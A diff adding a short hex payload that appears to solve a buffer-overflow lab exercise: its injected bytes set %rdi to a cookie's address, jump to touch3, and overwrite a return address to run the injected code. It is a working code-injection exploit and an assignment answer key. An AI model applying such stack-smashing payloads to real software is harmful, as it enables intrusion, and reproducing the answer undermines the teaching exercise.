@@ -1,0 +1,9 @@
+48 c7 c7 a8 dc 61 55 		/* mov $0x5561dca8, %rdi - touch3(&cookie) 	*/
+68 fa 18 40 00	 		/* pushq 0x4018fa - point to touch3  		*/
+c3				/* retq 					*/
+00 00 00 			/* filler 0x5561dc85 to ..dc87			*/
+00 00 00 00 00 00 00 00		/* filler 0x5561dc88 to ..dc8f 			*/
+00 00 00 00 00 00 00 00		/* filler 0x5561dc90 to ..dc97			*/
+00 00 00 00 00 00 00 00		/* 0x5561dc98 to ..dc9f				*/
+78 dc 61 55 00 00 00 00		/* swap return to test() with start of worm	*/
+35 39 62 39 39 37 66 61		/* Hex values of cookie 			*/
